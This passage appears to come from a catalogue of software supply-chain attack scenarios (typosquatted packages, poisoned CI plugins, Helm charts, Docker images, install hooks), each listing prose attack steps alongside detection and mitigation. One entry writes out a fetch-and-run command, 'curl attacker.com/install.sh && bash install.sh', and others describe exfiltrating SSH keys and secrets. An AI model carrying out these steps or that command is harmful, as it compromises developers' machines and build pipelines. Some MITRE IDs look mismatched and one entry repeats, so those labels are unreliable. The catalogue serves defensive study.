- **Attack Steps**: 1. Research popular Terraform modules (e.g., GitHub stars, documentation links).2. Upload a malicious module with a typo (e.g., terraform-google-loadblancer).3. Include encoded script in main.tf that initiates reverse shell on apply.4. Share link in public forums or submit PR with typo to open-source project.5. Victim copies example into production infra-as-code.6. Malicious module executes and attacker gains shell access to the host.
- **Detection**: Analyze newly downloaded modules during terraform init
- **Solution**: Always pin module sources and validate authorship
- **Tags**: terraform, typosquatting, infrastructure-as-code

## Compromising CI Tool Plugins from Marketplace

- **Attack Type**: Malicious Libraries
- **Target**: CI Systems
- **Vulnerability**: Trust in plugin ecosystem
- **MITRE**: T1195.002
- **Impact**: Persistent compromise of CI agents and secrets
- **Tools**: Jenkins, Java, Gradle
- **Scenario**: Attacker submits a Jenkins plugin with obfuscated malicious logic to public Jenkins Plugin Marketplace under a new developer identity.
- **Attack Steps**: 1. Fork a legitimate plugin project or create a new plugin from scratch.2. Add obfuscated malicious code (e.g., upload /etc/shadow on build trigger).3. Publish plugin to Jenkins Marketplace under an innocuous name (e.g., build-enhancer).4. Market plugin with fake stars and documentation.5. Victim installs plugin to improve build speeds.6. Plugin silently activates on every build, sending system information to attacker.
- **Detection**: Monitor plugin installation sources and behaviors
- **Solution**: Restrict plugin sources to audited internal registries
- **Tags**: jenkins, plugins, ci/cd, obfuscation

## Abusing Git Pre-Commit Hook Templates in Popular Repositories

- **Attack Type**: Malicious Libraries
- **Target**: Developers
- **Vulnerability**: Blind trust in starter templates
- **MITRE**: T1552.001
- **Impact**: Developer token theft and unauthorized GitHub access
- **Tools**: Git, Bash
- **Scenario**: Popular repo includes template .git/hooks/pre-commit script that silently collects developer tokens when cloned and initialized.
- **Attack Steps**: 1. Find GitHub repositories that include .git/hooks directory with pre-filled hooks.2. Modify hook script to capture environment variables (e.g., GitHub tokens, AWS credentials).3. Share the repository as a starter template for new devs.4. New users clone the repo and run git init.5. Malicious pre-commit hook executes, sending creds to attacker.6. Attacker uses tokens for lateral movement or supply chain poisoning.
- **Detection**: Monitor outgoing requests from Git hook executions
- **Solution**: Avoid committing pre-filled hooks in public repositories
- **Tags**: git, hooks, token theft, dev onboarding

## Malicious PyPI Package with Platform-Aware Payload

- **Attack Type**: Malicious Libraries
- **Target**: Linux Servers
- **Vulnerability**: Platform-aware conditional payload logic
- **MITRE**: T1195.002
- **Impact**: Exfiltration from production systems without alerting devs
- **Tools**: PyPI, Python, requests
- **Scenario**: PyPI package checks OS before executing — payload only activates on Linux servers to avoid suspicion during testing.
- **Attack Steps**: 1. Create a PyPI package with an innocent name (e.g., utils-helper).2. Inside setup.py, add OS check — execute malicious payload only if on linux.3. Exfiltrate SSH keys or curl sensitive env variables.4. Upload to PyPI with high install count via automation.5. Victim installs on Linux-based prod server.6. Payload triggers, attacker receives system data.7. On macOS/Windows dev machines, the code silently does nothing.
- **Detection**: Static analysis for OS-specific branches in code
- **Solution**: Analyze install-time behavior and metadata of packages
- **Tags**: pypi, conditional payloads, linux targeting

## MITM Proxy Injection During Developer Onboarding

- **Attack Type**: Malicious Libraries
- **Target**: Developers
- **Vulnerability**: Lack of HTTPS pinning / proxy protection
- **MITRE**: T1557.002
- **Impact**: Full compromise of developer machine and session tokens
- **Tools**: mitmproxy, Burp, Wi-Fi Pineapple
- **Scenario**: Attacker sets up a transparent MITM proxy on public Wi-Fi that injects malicious dependencies into pip/npm installs during dev onboarding.
- **Attack Steps**: 1. Set up rogue Wi-Fi access point at co-working space.2. Configure MITM proxy to intercept HTTP(S) traffic.3. Wait for developers to run pip install or npm install.4. Inject modified response pointing to attacker-hosted package.5. Dev unknowingly installs malicious dependency.6. Malicious payload steals local config files (e.g., .env, .aws/credentials).
- **Detection**: Use DNS monitoring and cert validation on dev endpoints
- **Solution**: Always use trusted networks; enforce HTTPS verification
- **Tags**: mitm, onboarding, rogue wifi, developer compromise

## Supply Chain Backdoor via Archived GitHub Repo Revival

- **Attack Type**: Malicious Libraries
- **Target**: Open Source
- **Vulnerability**: Dependency on GitHub source with no author validation
- **MITRE**: T1195.002
- **Impact**: Compromise of downstream projects reusing old GitHub links
- **Tools**: Git, GitHub API, curl
- **Scenario**: Abandoned GitHub repo is revived by attacker after original dev deletes account — reused name now hosts malicious release.
- **Attack Steps**: 1. Monitor GitHub for deleted user accounts and abandoned repos.2. Register the same GitHub username.3. Recreate the same repository (e.g., user/old-library).4. Publish a malicious v1.2.3 release with backdoor in build logic.5. Victim projects using old pinned GitHub source reference auto-pull the latest commit.6. Malicious code runs as part of install.sh or CI action.7. Attacker receives shell or secrets.
- **Detection**: Alert on package source URL changes or domain revivals
- **Solution**: Host packages only on audited registries or archive mirrors
- **Tags**: github, repo hijack, abandoned projects

## Hijacking Unused BowerJS Package Names

- **Attack Type**: Dependency Confusion
- **Target**: Frontend Apps
- **Vulnerability**: Deprecated package management ecosystem
- **MITRE**: T1195.002
- **Impact**: Credential theft, data exposure from browsers
- **Tools**: BowerJS, HTML, JS, DNSLog
- **Scenario**: BowerJS registry allows unused package names — attacker registers an unused name referenced in legacy frontend projects.
- **Attack Steps**: 1. Find old frontend projects using Bower (via GitHub search for bower.json).2. Extract names of unregistered or deleted packages.3. Register those names with attacker-controlled versions.4. Inject malicious JavaScript (e.g., keylogger or beacon).5. Victim’s CI or browser loads the script when app runs in prod.6. Attacker monitors beacon calls with credentials.7. Data exfiltrated from unsuspecting frontend app.
- **Detection**: Static analysis of bower.json in legacy systems
- **Solution**: Decommission old Bower projects and migrate to modern tools
- **Tags**: bower, frontend, js injection, legacy

## Cloud-init Exploit via Public Image Injection

- **Attack Type**: Infrastructure Injection
- **Target**: Cloud VMs
- **Vulnerability**: Blind trust in public OS images
- **MITRE**: T1601.001
- **Impact**: Full cloud credential takeover and potential pivoting
- **Tools**: AWS EC2, cloud-init, Base64
- **Scenario**: Attacker publishes a public VM image with a backdoored cloud-init script that exfiltrates metadata on first boot.
- **Attack Steps**: 1. Create and configure a Linux AMI or Azure image.2. Embed malicious cloud-init script to exfiltrate metadata service token via curl.3. Publish the image publicly with attractive description (e.g., “hardened Ubuntu 22.04 with Docker”).4. Victim selects image to speed up deployment.5. On first boot, cloud-init executes script silently.6. Attacker receives IAM token or env variable output.7. Uses that for lateral movement.
- **Detection**: Audit source of custom AMIs or image templates
- **Solution**: Always use official base images or internally scanned ones
- **Tags**: cloud-init, cloud image, metadata token

## Bitbucket Pipelines Poisoning via Malicious Docker Image

- **Attack Type**: Malicious Libraries
- **Target**: CI Pipelines
- **Vulnerability**: Use of unverified or unpinned Docker images
- **MITRE**: T1195.002
- **Impact**: Stealing secrets from build containers
- **Tools**: Docker Hub, Bitbucket Pipelines
- **Scenario**: Attacker publishes a Docker image with malicious entrypoint.sh, tricking Bitbucket pipelines that reference latest tag.
- **Attack Steps**: 1. Search open-source projects using Bitbucket Pipelines with Docker image like mycorp/build-env:latest.2. Find that mycorp is not claimed on Docker Hub.3. Register the namespace and publish a malicious image with same tag.4. Add malicious entrypoint to exfiltrate secrets.5. Victim’s CI pipeline pulls and runs the attacker’s image during build.6. Attacker receives SSH keys or repo secrets via webhook.
- **Detection**: Image signature checking or pinning image digests
- **Solution**: Pin exact image hashes and avoid use of latest tag
- **Tags**: docker, bitbucket, pipelines, image poisoning

## Bitbucket Pipelines Poisoning via Malicious Docker Image

- **Attack Type**: Malicious Libraries
- **Target**: CI Pipelines
- **Vulnerability**: Use of unverified or unpinned Docker images
- **MITRE**: T1195.002
- **Impact**: Stealing secrets from build containers
- **Tools**: Docker Hub, Bitbucket Pipelines
- **Scenario**: Attacker publishes a Docker image with malicious entrypoint.sh, tricking Bitbucket pipelines that reference latest tag.
- **Attack Steps**: 1. Search open-source projects using Bitbucket Pipelines with Docker image like mycorp/build-env:latest.2. Find that mycorp is not claimed on Docker Hub.3. Register the namespace and publish a malicious image with same tag.4. Add malicious entrypoint to exfiltrate secrets.5. Victim’s CI pipeline pulls and runs the attacker’s image during build.6. Attacker receives SSH keys or repo secrets via webhook.
- **Detection**: Image signature checking or pinning image digests
- **Solution**: Pin exact image hashes and avoid use of latest tag
- **Tags**: docker, bitbucket, pipelines, image poisoning

## Exploiting BuildKit Caching to Inject Malicious Layers

- **Attack Type**: Build System Abuse
- **Target**: CI/CD Pipelines
- **Vulnerability**: Docker BuildKit cache reuse
- **MITRE**: T1195.002 (Supply Chain Compromise)
- **Impact**: Malicious code runs inside production containers without detection during build.
- **Tools**: Docker BuildKit, Docker Hub
- **Scenario**: Attacker exploits Docker BuildKit layer caching to smuggle a malicious layer into images reused by downstream projects during multi-stage builds.
- **Attack Steps**: 1. Attacker creates a public image that uses BuildKit's layer cache feature, ensuring layers have specific digests and match popular base images. 2. They include a hidden malicious binary in one of the middle layers. 3. A target developer unknowingly builds a Dockerfile that pulls from this image with --cache-from, trusting cached layers. 4. The malicious layer is reused silently by the builder. 5. During image runtime, the attacker’s malware runs in the container environment with inherited privileges.
- **Detection**: Monitor cache usage & diff base images during builds
- **Solution**: Disable untrusted --cache-from; validate image sources
- **Tags**: docker, ci/cd, build system, image poisoning, malware

## Typosquatting a Lesser-Known Python Plugin in Private Repos

- **Attack Type**: Dependency Confusion
- **Target**: Python Dev Envs
- **Vulnerability**: Typosquatting on public registries
- **MITRE**: T1195.001 (Compromise Software Dependencies)
- **Impact**: Secret exfiltration, RCE, or session hijacking in dev/staging environments
- **Tools**: PyPI, Twine, Virtualenv
- **Scenario**: A malicious actor typosquats a Python plugin used internally by a small company by uploading it with a similar name to PyPI.
- **Attack Steps**: 1. Attacker analyzes GitHub repos or job postings to find internal dependencies like acme-utils-tools. 2. They register a fake PyPI package acmeutils-tools. 3. The fake package mimics the expected structure but includes a payload in __init__.py. 4. During local or CI-based installs with a typo, pip pulls the attacker’s version instead. 5. Once imported, the payload runs and collects secrets or opens a reverse shell.
- **Detection**: Monitor for unexpected installs from public registries
- **Solution**: Use internal mirrors; verify dependency integrity
- **Tags**: pypi, python, dependency confusion, internal package leak

## Abusing Git Submodules to Deliver Malicious Payloads

- **Attack Type**: Repo Hijacking
- **Target**: Developers
- **Vulnerability**: Malicious git submodule injection
- **MITRE**: T1195.002 (Supply Chain Compromise)
- **Impact**: Credential theft, persistent backdoors via cloned submodules
- **Tools**: Git, GitHub, Burp Suite
- **Scenario**: The attacker adds a malicious Git submodule link in an open-source project’s .gitmodules file, which fetches and executes arbitrary code on git clone.
- **Attack Steps**: 1. Attacker forks an open-source GitHub project that uses submodules. 2. They change the .gitmodules config to point to their malicious repo under the same submodule path. 3. They submit a PR with other useful changes to encourage merging. 4. Once merged, any developer using git clone --recurse-submodules fetches and executes attacker’s submodule. 5. The malicious submodule includes pre/post install hooks that steal SSH keys or tokens.
- **Detection**: Scan .gitmodules during reviews and PRs
- **Solution**: Block unknown submodule URLs; disable auto-submodule resolution
- **Tags**: git, github, supply chain, submodule injection, repo poisoning

## Hijacking Homebrew Formula for CLI Tool Distribution

- **Attack Type**: Package Manager Abuse
- **Target**: macOS Developers
- **Vulnerability**: Insecure formula referencing external sources
- **MITRE**: T1195.002 (Supply Chain Compromise)
- **Impact**: System-level compromise through malicious CLI tools
- **Tools**: Homebrew, Git, SHA256sum
- **Scenario**: Attacker hijacks a neglected Homebrew formula used for installing a CLI tool by injecting a malicious binary under the guise of a version update.
- **Attack Steps**: 1. Attacker identifies a CLI tool with an outdated Homebrew formula not maintained actively. 2. They fork the repo and update the formula to point to a new binary hosted on attacker’s site. 3. They modify the SHA256 hash to match the malicious binary. 4. A user runs brew install toolname from the formula and installs the attacker’s version. 5. The malicious binary has hidden features like data exfiltration or shell access.
- **Detection**: Monitor custom taps and binaries
- **Solution**: Always validate formula sources; use notarized binaries
- **Tags**: homebrew, mac, package poisoning, cli hijack

## Compromising Helm Chart to Inject Backdoor in Kubernetes Deployment

- **Attack Type**: Chart/Template Poison
- **Target**: Kubernetes Clusters
- **Vulnerability**: Unsafe chart template modification
- **MITRE**: T1195.002 (Supply Chain Compromise)
- **Impact**: Leaked Kubernetes secrets, lateral movement within cluster
- **Tools**: Helm, Kubernetes, kubeval
- **Scenario**: Attacker modifies a Helm chart template file to include a malicious container or init container in production deployments.
- **Attack Steps**: 1. Attacker contributes to a Helm chart repo for a popular app, sneaking in an initContainer template in deployment.yaml. 2. This initContainer pulls from a malicious image that runs a secret-exfiltration script. 3. The main chart appears unaffected, and installation proceeds as normal. 4. Organizations installing the chart apply the template to their cluster, unknowingly pulling the attacker’s container. 5. The backdoor script copies secrets from mounted volumes and sends them to a remote server.
- **Detection**: Validate chart manifests; use static analysis tools
- **Solution**: Use signed Helm charts; validate image digests
- **Tags**: helm, kubernetes, supply chain, initcontainer backdoor

## Using Malicious Go Modules with Vanity URLs to Mislead Developers

- **Attack Type**: Dependency Confusion
- **Target**: Go Dev Envs
- **Vulnerability**: Vanity import path spoofing
- **MITRE**: T1195.001 (Compromise Software Dependencies)
- **Impact**: Secret leakage, credential harvesting in Go environments
- **Tools**: Go Modules, Vanity URLs, Whois
- **Scenario**: Attacker registers a malicious Go module with a vanity import path that mimics a trusted domain, tricking go get into installing a rogue package.
- **Attack Steps**: 1. Attacker registers a domain golang.acme-corp.com and configures it with go-import meta tags to point to their malicious repo. 2. They create a module acme-corp.com/tools/auth with similar structure to the original. 3. Developers relying on Go's vanity URLs (go get acme-corp.com/tools/auth) unknowingly install attacker’s module. 4. This module has logic to run on import, such as uploading env vars to a webhook. 5. Since vanity URLs look official, the attack often bypasses scrutiny.
- **Detection**: Audit import paths & go.sum hashes
- **Solution**: Use go proxy with checksumdb; disable custom vanity resolutions
- **Tags**: golang, module spoofing, vanity abuse, dependency confusion

## Typosquatting in Internal GitLab Registry

- **Attack Type**: Typosquatting
- **Target**: CI/CD Environment
- **Vulnerability**: Insecure naming convention in private registries
- **MITRE**: T1195.002
- **Impact**: CI/CD Compromise, Credential Theft
- **Tools**: GitLab, Python
- **Scenario**: An attacker uploads a malicious library named internal-utils (vs internal_utils) into a private GitLab registry used within a company’s internal CI/CD pipelines.
- **Attack Steps**: 1. Attacker gains access to a GitLab instance (open registration or leaked credentials).2. Creates a malicious project named internal-utils (instead of internal_utils) that mimics the interface.3. Publishes it to the internal GitLab package registry.4. A developer accidentally pulls the wrong package in their .gitlab-ci.yml.5. The CI/CD runner executes the attacker’s code (backdoor or data exfiltration).
- **Detection**: Monitor CI/CD logs, enforce registry signing, audit package names
- **Solution**: Lockdown GitLab project creation, enforce hash pinning
- **Tags**: #Typosquatting #GitLab #CI #InternalThreat

## Dependency Confusion in PyInstaller Hook System

- **Attack Type**: Dependency Confusion
- **Target**: Software Build Pipeline
- **Vulnerability**: PyInstaller’s dynamic import mechanism
- **MITRE**: T1195.002
- **Impact**: Backdoored binary artifacts
- **Tools**: PyInstaller, PyPI
- **Scenario**: Exploiting PyInstaller’s hook system by injecting a malicious module with a common name used in frozen binaries.
- **Attack Steps**: 1. Identify a common hook name used by PyInstaller (e.g., hook-sqlite3.py).2. Create a package named hook_sqlite3 on PyPI with malicious logic.3. Target projects using automated build systems that download this from PyPI.4. When a build happens, the malicious hook injects payload during freezing.5. Resulting binary includes attacker's code stealthily.
- **Detection**: Compare frozen binary hash with clean versions, inspect hidden imports
- **Solution**: Use local-only hooks, block external hook downloads
- **Tags**: #PyInstaller #DependencyConfusion #BinaryBackdoor

## NPM Maintainer Social Engineering

- **Attack Type**: Social Engineering
- **Target**: Open Source Packages
- **Vulnerability**: Human trust in social engineering
- **MITRE**: T1204.002
- **Impact**: Mass compromise via trusted package
- **Tools**: NPM, Email Spoofing
- **Scenario**: A threat actor tricks an NPM package maintainer into adding them as a collaborator and pushes malicious updates.
- **Attack Steps**: 1. Identify maintainers of widely used NPM packages (e.g., via NPMJS or GitHub).2. Spoof email as a company representative offering sponsorship.3. Convince maintainer to add attacker as a collaborator to offload maintenance.4. Attacker pushes backdoored update to the NPM registry.5. Unsuspecting users upgrade and get compromised.
- **Detection**: Monitor for sudden collaborator changes, verify commit origin
- **Solution**: Enforce maintainer verification, rotate keys frequently
- **Tags**: #NPM #SocialEngineering #MaintainerHijack

## Compromised Go Module via Replace Directive

- **Attack Type**: Go Module Abuse
- **Target**: Developers, Build Systems
- **Vulnerability**: Trusting replace directives without audit
- **MITRE**: T1195.002
- **Impact**: Build-time compromise, developer infection
- **Tools**: Go, GitHub
- **Scenario**: An attacker uploads a malicious module that is referenced through the replace directive in go.mod, bypassing usual imports.
- **Attack Steps**: 1. Create a GitHub repo with a Go module named example.com/tools containing malicious code.2. Create a public sample project that includes replace example.com/tools => github.com/attacker/malicious.3. Developers copying codebases inherit the replace directive.4. During go build, attacker’s repo is pulled and executed.5. Malware executes inside build environment.
- **Detection**: Monitor external repo calls in builds
- **Solution**: Block unknown replace sources, audit go.mod regularly
- **Tags**: #Golang #ReplaceDirective #ModuleHijack

## Bitbucket Pipeline Poisoning

- **Attack Type**: CI/CD Abuse
- **Target**: Bitbucket CI/CD
- **Vulnerability**: PR-based pipeline trust
- **MITRE**: T1195.002
- **Impact**: Exfiltration of CI secrets
- **Tools**: Bitbucket Pipelines, curl
- **Scenario**: Malicious contributor injects payload in a bitbucket-pipelines.yml script during PRs, triggering secrets exfiltration on merge.
- **Attack Steps**: 1. Fork a public Bitbucket repo using pipelines for CI.2. Modify bitbucket-pipelines.yml to include a curl command sending env variables to attacker.3. Submit a legit PR with hidden pipeline changes.4. Maintainer merges the PR.5. CI pipeline runs with secrets in env, which attacker receives via webhook.
- **Detection**: Scan PRs for pipeline file changes
- **Solution**: Restrict pipeline changes, require codeowner reviews
- **Tags**: #Bitbucket #PipelinePoisoning #SecretsLeak

## Typosquatting Inside GitHub Actions Marketplace

- **Attack Type**: Typosquatting
- **Target**: CI/CD Pipelines
- **Vulnerability**: GitHub Action namespace confusion
- **MITRE**: T1195.002
- **Impact**: RCE in GitHub runners, secrets theft
- **Tools**: GitHub Actions
- **Scenario**: Uploading an action named actions/chekout instead of actions/checkout to GitHub Marketplace and waiting for accidental usage.
- **Attack Steps**: 1. Create a GitHub Action named chekout (with typo).2. Mimic the interface of actions/checkout but insert payload (e.g., credential theft, RCE).3. Publish to GitHub Marketplace.4. Developers accidentally typo the action name in their workflows.5. The attacker’s action executes in the workflow.
- **Detection**: Monitor workflows for suspicious action names
- **Solution**: Use SHA-pinned verified actions only
- **Tags**: #GitHubActions #Typosquatting #WorkflowAttack

## Compromised Terraform Module Registry

- **Attack Type**: Registry Injection
- **Target**: Cloud Infrastructure
- **Vulnerability**: Unverified use of public IaC modules
- **MITRE**: T1195.002
- **Impact**: Backdoor in provisioned infra
- **Tools**: Terraform, Registry
- **Scenario**: Attacker uploads a popular-looking Terraform module (e.g., aws-s3-secure) with hidden resource creation to exfiltrate data.
- **Attack Steps**: 1. Publish a module named aws-s3-secure to Terraform public registry.2. Add seemingly legitimate functionality, but inject hidden resources (e.g., IAM policy giving attacker access).3. Target infrastructure teams reusing public modules.4. On terraform apply, resources are provisioned with attacker's access.5. Attacker gains foothold in cloud infra.
- **Detection**: Audit plan output and module sources
- **Solution**: Use internal registries, verify hash of modules
- **Tags**: #Terraform #IaC #ModuleBackdoor

## Preinstall Script Abuse in Yarn

- **Attack Type**: Script Injection
- **Target**: Developer Machines
- **Vulnerability**: Abuse of install lifecycle hooks
- **MITRE**: T1203
- **Impact**: Token theft, initial access to dev systems
- **Tools**: Yarn, Node.js
- **Scenario**: A malicious dependency uses preinstall to run credential theft logic even before the app is installed.
- **Attack Steps**: 1. Publish a package to NPM with a preinstall script that executes malicious logic.2. Add it as a transitive dependency of a commonly used utility.3. When developers run yarn install, the script executes automatically.4. The attacker’s code steals .npmrc tokens and uploads to attacker server.5. No install completion is even needed.
- **Detection**: Monitor install scripts in dependencies
- **Solution**: Disable scripts during install unless audited
- **Tags**: #Yarn #NPM #PreinstallAbuse

## Malicious Docker Base Image via DockerHub

- **Attack Type**: Container Image Poisoning
- **Target**: Containers
- **Vulnerability**: Unverified base image usage
- **MITRE**: T1195.002
- **Impact**: Full container takeover
- **Tools**: Docker, DockerHub
- **Scenario**: A public DockerHub image (node-app-base) includes an extra layer with malware that phones home during container boot.
- **Attack Steps**: 1. Attacker builds a base image (node-app-base) that looks like a popular base image.2. Adds a layer that runs a reverse shell upon container start.3. Publishes it with legitimate tags (latest, v14, etc.) on DockerHub.4. Developers use this base unknowingly in Dockerfiles.5. Each built image includes the backdoor, giving attacker access.
- **Detection**: Monitor runtime for unknown processes, inspect layers
- **Solution**: Use signed, trusted base images only
- **Tags**: #DockerHub #ContainerSecurity #ImageBackdoor

## Compromised CI Plugin via Marketplace

- **Attack Type**: Third-Party Plugin Injection
- **Target**: CI/CD Server
- **Vulnerability**: Inadequate plugin vetting
- **MITRE**: T1195.002 – Supply Chain Compromise: Compiled Software
- **Impact**: Full compromise of CI secrets, lateral movement into cloud environments
- **Tools**: Custom CI Plugin, ngrok
- **Scenario**: An attacker uploads a CI plugin to a popular CI/CD plugin marketplace. Once installed by target teams, the plugin exfiltrates secrets during pipeline execution.
- **Attack Steps**: 1. Attacker builds a CI plugin that mimics a common integration tool (e.g., Slack Notifier).2. Inside the plugin code, a malicious function reads environment variables like AWS_SECRET_ACCESS_KEY and CI_JOB_TOKEN.3. The attacker uploads the plugin to an open plugin marketplace like Jenkins Plugin Index.4. A DevOps engineer unknowingly installs this plugin into their CI instance.5. During each build, secrets are exfiltrated to the attacker's server.6. Attacker uses these credentials to pivot into the infrastructure.
- **Detection**: Monitor unusual plugin behavior, alert on unknown outgoing traffic in build environments
- **Solution**: Vet all third-party plugins, enforce plugin allowlists
- **Tags**: CI/CD, Plugin Abuse, Secret Theft

## NPM Install Hook Exfiltrating SSH Keys

- **Attack Type**: Malicious Package (PostInstall)
- **Target**: Developer Machine
- **Vulnerability**: NPM postinstall scripts
- **MITRE**: T1556 – Modify Authentication Process
- **Impact**: Exfiltration of developer's private keys, risk of lateral Git or server compromise
- **Tools**: NPM, ngrok, Netcat
- **Scenario**: A developer installs a package with a malicious postinstall hook that silently uploads the user’s ~/.ssh/id_rsa to a remote server.
- **Attack Steps**: 1. Attacker publishes a package named colors-cli-proxy, closely mimicking colors-cli.2. Inside package.json, a postinstall script is defined that runs curl to exfiltrate ~/.ssh/id_rsa.3. A developer installing this on macOS or Linux triggers the script during npm install.4. The script silently sends the private key to the attacker’s webhook endpoint.5. The attacker then uses the SSH key to access internal Git or server infrastructure.6. Persistence is attempted by modifying shell RC files via the same install hook.
- **Detection**: Monitor install hooks; hash audit installed scripts
- **Solution**: Disable postinstall by default; review untrusted packages
- **Tags**: NPM, Hook Abuse, Credential Theft

## Dependency Confusion in Python Internal Repo

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD Pipeline
- **Vulnerability**: Misconfigured dependency resolution order
- **MITRE**: T1195.001 – Supply Chain Compromise: Software Dependencies and Development Tools
- **Impact**: Unauthorized code execution in build pipelines, secrets exposed
- **Tools**: PyPI, pip, MITM Proxy
- **Scenario**: A company hosts internal packages like internal-auth-lib, but a public PyPI version is created with the same name, leading the internal CI server to install the attacker's version during pipeline builds.
- **Attack Steps**: 1. Attacker enumerates internal package names via error messages or config leaks (e.g., pip install internal-auth-lib).2. Creates a public PyPI package with that exact name.3. Includes data exfiltration and RCE in the setup.py or package code.4. CI server with access to both PyPI and internal index accidentally prioritizes the public version.5. During the next build, the malicious package executes within the pipeline.6. Sensitive environment variables and tokens are extracted and sent to a remote server.7. The attacker potentially gains persistence by writing backdoor artifacts into internal storage.
- **Detection**: Monitor package sources during install, enforce index restrictions
- **Solution**: Use strict version pinning; restrict builds to private registries
- **Tags**: Python, Dependency Confusion, Build Pipeline

## Hijacking GitHub Action via Typo in Workflow Name

- **Attack Type**: GitHub Action Workflow Abuse
- **Target**: GitHub Repo
- **Vulnerability**: Typo-based indirect workflow resolution
- **MITRE**: T1609 – Container Administration Command
- **Impact**: Malicious code execution with GitHub token permissions
- **Tools**: GitHub Actions, Custom Repo
- **Scenario**: A typo in the GitHub Actions workflow name causes a fallback to a malicious workflow template stored in a public GitHub repository with the same name.
- **Attack Steps**: 1. Attacker searches for open-source repos using reusable workflows via uses: directive.2. Notices typo or missing tag (e.g., org/workflows@v2 used instead of org/workflows/.github@v2).3. Creates a GitHub repo matching the unresolved name with a malicious main.yml.4. The typo causes GitHub Actions to pull the attacker's workflow.5. Malicious steps include curl to exfiltrate environment secrets or deploy backdoors.6. On merge or PR events, the malicious workflow runs with GITHUB_TOKEN permissions.7. Attacker uses this to create issues, modify code, or escalate.
- **Detection**: Validate workflow uses: sources and resolve them explicitly
- **Solution**: Use hash-pinned workflows and verify source repositories
- **Tags**: GitHub, Actions, Workflow Hijack

## Malicious Helm Chart for Kubernetes Deployment

- **Attack Type**: Malicious Deployment Manifest
- **Target**: Kubernetes Cluster
- **Vulnerability**: Helm chart content not validated
- **MITRE**: T1525 – Implant Internal Image
- **Impact**: Compromise of workloads via templated malicious containers
- **Tools**: Helm, K8s, Netcat
- **Scenario**: A Helm chart uploaded to ArtifactHub includes a sidecar container that communicates with an attacker server, enabling data exfiltration post-deployment.
- **Attack Steps**: 1. Attacker creates a Helm chart for a common app (e.g., Redis Dashboard) with proper templates.2. Adds a hidden sidecar container in deployment.yaml that runs a reverse shell or opens a tunnel.3. Publishes it to ArtifactHub or Docker Hub.4. DevOps team installs it into staging or prod without reviewing the manifest fully.5. The sidecar initiates outbound traffic to the attacker-controlled server.6. Attacker now has remote access into the K8s pod and begins reconnaissance.7. Attempts lateral movement via service accounts or mounted secrets.
- **Detection**: Monitor outbound pod traffic, validate charts
- **Solution**: Use curated Helm repositories; scan manifests before deployment
- **Tags**: Kubernetes, Helm, Sidecar Exploits

## Poisoned VSCode Extension Leaking Env Vars

- **Attack Type**: Developer Tool Abuse
- **Target**: Developer IDE
- **Vulnerability**: Lack of extension permission isolation
- **MITRE**: T1056.001 – Input Capture
- **Impact**: Exposure of developer credentials and build secrets
- **Tools**: VSCode, Burp Suite
- **Scenario**: A malicious Visual Studio Code extension silently uploads environment variables (including tokens) to an external server every time the user opens a terminal or project.
- **Attack Steps**: 1. Attacker clones a popular extension and injects a JS script that reads process.env.2. Publishes it under a slightly altered name (e.g., Docker Tools++).3. Developer installs it for syntax highlighting or linting.4. On project open or terminal run, the extension triggers and sends all env variables to a webhook.5. The attacker harvests credentials like AWS_PROFILE, Git tokens, etc.6. If it includes build secrets, attacker gains insight into CI/CD systems and further exploits them.7. The extension optionally installs persistence using VSCode settings or scripts.
- **Detection**: Monitor outgoing traffic from IDE, use extension sandboxing
- **Solution**: Only install vetted extensions; enforce internal extension allowlist
- **Tags**: VSCode, Extension Abuse, DevSecOps

## Altered Package with Malicious Dependency Tree

- **Attack Type**: Transitive Dependency Injection
- **Target**: Application Package
- **Vulnerability**: Transitive dependency tampering
- **MITRE**: T1543 – Create or Modify System Process
- **Impact**: Hidden code execution via nested dependencies
- **Tools**: Yarn, npm, dep-tree-parser
- **Scenario**: An attacker modifies an open-source package by injecting a malicious sub-dependency deep in the dependency tree, hidden from basic inspection tools.
- **Attack Steps**: 1. Attacker forks a popular package and publishes a forked version (e.g., axios-plus).2. Adds a deep-level dependency like stream-utils-ext, which contains malicious code.3. When dev installs axios-plus, the deep dependency executes a crypto miner.4. Static tools miss this due to deep nesting and dynamic requires.5. Miner launches as background process whenever the app starts in dev.6. Attacker earns profit via cryptojacking across developer machines or staging servers.7. Miner hides via renaming and using low CPU mode.
- **Detection**: Analyze full dependency tree, use software composition analysis
- **Solution**: Flatten dependency trees and ban nested unknown packages
- **Tags**: Transitive Dependency, NodeJS, Miner

## Malicious Dockerfile with Extra Build Instructions

- **Attack Type**: Build Process Backdooring
- **Target**: Container Image
- **Vulnerability**: Unvalidated Docker build instructions
- **MITRE**: T1608.004 – Stage Capabilities: Upload Tool
- **Impact**: Backdoored image enters internal registry and prod pipeline
- **Tools**: Docker, Docker Hub
- **Scenario**: A seemingly useful Dockerfile template on GitHub includes hidden curl commands during image build to create outbound connections.
- **Attack Steps**: 1. Attacker uploads a Dockerfile claiming to improve build speed or caching.2. In the middle of a RUN chain, inserts curl attacker.com/install.sh && bash install.sh.3. DevOps team copies this into an internal image base.4. During build, the container pulls the malicious script which installs a reverse shell.5. Resulting image includes malware before being pushed to internal registry.6. When deployed, it opens a backdoor or starts beaconing.7. Exploitation begins via internal network mapping or lateral container movement.
- **Detection**: Static analysis of Dockerfiles; inspect layers for anomalies
- **Solution**: Use internal trusted Dockerfiles; disallow external script runs
- **Tags**: Docker, Image Abuse, DevOps

## Poisoned License File Executing Code in Setup

- **Attack Type**: Installer Abuse
- **Target**: Python Package
- **Vulnerability**: Custom installer logic executing non-code files
- **MITRE**: T1204 – User Execution
- **Impact**: Arbitrary code execution during pip install
- **Tools**: pip, Python, custom setup.py
- **Scenario**: A malicious Python project includes a license file that runs as a Python script when installation tools accidentally execute it (e.g., custom setup.py behavior).
- **Attack Steps**: 1. Attacker creates a Python library with a setup.py that copies the LICENSE file and executes it.2. Inside LICENSE, the content is valid but ends with an embedded Python script (e.g., obfuscated payload).3. During install or test, a bug in setup.py reads and executes LICENSE for processing.4. Payload spawns a reverse shell or data exfil.5. The attacker then cleans up by removing traces via postinstall hook.6. Resulting shell gives access to dev’s system or pipeline container.7. Optional persistence added via cron job creation.
- **Detection**: Disallow LICENSE execution paths; validate setup.py logic
- **Solution**: Review and sanitize all file interactions in setup phase
- **Tags**: Python, Obfuscated Payload, LICENSE Abuse

## Internal Package Repo Misrouting to Public Registry

- **Attack Type**: Repository Configuration Error
- **Target**: Internal Dev Systems
- **Vulnerability**: Misconfigured registry fallback
- **MITRE**: T1195.001 – Supply Chain Compromise: Dependencies
- **Impact**: Unauthorized package gets executed inside CI or dev environments
